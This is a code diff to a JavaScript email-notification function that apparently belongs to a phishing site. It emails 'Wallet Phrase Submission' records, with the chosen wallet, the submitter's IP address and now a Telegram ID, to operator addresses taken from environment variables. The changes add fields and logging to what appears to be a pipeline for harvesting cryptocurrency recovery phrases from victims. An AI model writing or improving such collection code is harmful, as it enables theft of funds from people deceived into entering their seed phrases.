@@ -6,15 +6,31 @@ export async function sendEmailNotification(submission) {
   try {
     console.log('Starting email notification process...')
     console.log('Resend API Key exists:', !!process.env.RESEND_API_KEY)
+    console.log('Environment variables:', {
+      RESEND_API_KEY: process.env.RESEND_API_KEY ? 'Set' : 'Missing',
+      NOTIFICATION_EMAIL: process.env.NOTIFICATION_EMAIL ? 'Set' : 'Missing',
+      NOTIFICATION_EMAILS: process.env.NOTIFICATION_EMAILS ? 'Set' : 'Missing'
+    })
     
-    // Get notification emails from environment variable
-    const notificationEmails = process.env.NOTIFICATION_EMAILS?.split(',').map(email => email.trim()) || []
+    // Check if Resend API key is available
+    if (!process.env.RESEND_API_KEY) {
+      console.error('❌ RESEND_API_KEY is missing! Emails cannot be sent.')
+      return { error: 'RESEND_API_KEY not configured' }
+    }
     
-    console.log('Notification emails:', notificationEmails)
+    // Get notification emails from environment variables (support both singular and plural)
+    let notificationEmails = []
+    if (process.env.NOTIFICATION_EMAILS) {
+      notificationEmails = process.env.NOTIFICATION_EMAILS.split(',').map(email => email.trim())
+    } else if (process.env.NOTIFICATION_EMAIL) {
+      notificationEmails = [process.env.NOTIFICATION_EMAIL.trim()]
+    }
+    
+    console.log('Notification emails found:', notificationEmails)
     
     if (notificationEmails.length === 0) {
-      console.log('No notification emails configured')
-      return
+      console.error('❌ No notification emails configured! Set either NOTIFICATION_EMAIL or NOTIFICATION_EMAILS')
+      return { error: 'No notification emails configured' }
     }
 
     // Format the email content
@@ -44,6 +60,12 @@ export async function sendEmailNotification(submission) {
               <td style="padding: 8px 0; font-weight: bold; color: #475569;">IP Address:</td>
               <td style="padding: 8px 0; color: #1e293b;">${submission.ip}</td>
             </tr>
+            ${submission.telegramId ? `
+            <tr>
+              <td style="padding: 8px 0; font-weight: bold; color: #475569;">Telegram ID:</td>
+              <td style="padding: 8px 0; color: #1e293b;">${submission.telegramId}</td>
+            </tr>
+            ` : ''}
           </table>
         </div>
         
@@ -67,15 +89,15 @@ export async function sendEmailNotification(submission) {
       </div>
     `
 
-         // Send email to all notification addresses
-     const emailPromises = notificationEmails.map(email => 
-       resend.emails.send({
-         from: 'Twefrase <onboarding@resend.dev>',
-         to: email,
-         subject: `🔐 New Wallet Phrase Submission - ${submission.selectedWallet}`,
-         html: emailContent
-       })
-     )
+    // Send email to all notification addresses
+    const emailPromises = notificationEmails.map(email => 
+      resend.emails.send({
+        from: 'Twefrase <onboarding@resend.dev>',
+        to: email,
+        subject: `🔐 New Wallet Phrase Submission - ${submission.selectedWallet}`,
+        html: emailContent
+      })
+    )
 
     // Wait for all emails to be sent
     const results = await Promise.allSettled(emailPromises)
@@ -96,7 +118,12 @@ export async function sendEmailNotification(submission) {
     return results
 
   } catch (error) {
-    console.error('Error sending email notification:', error)
+    console.error('❌ Error sending email notification:', error)
+    console.error('Error details:', {
+      message: error.message,
+      stack: error.stack,
+      name: error.name
+    })
     throw error
   }
 }
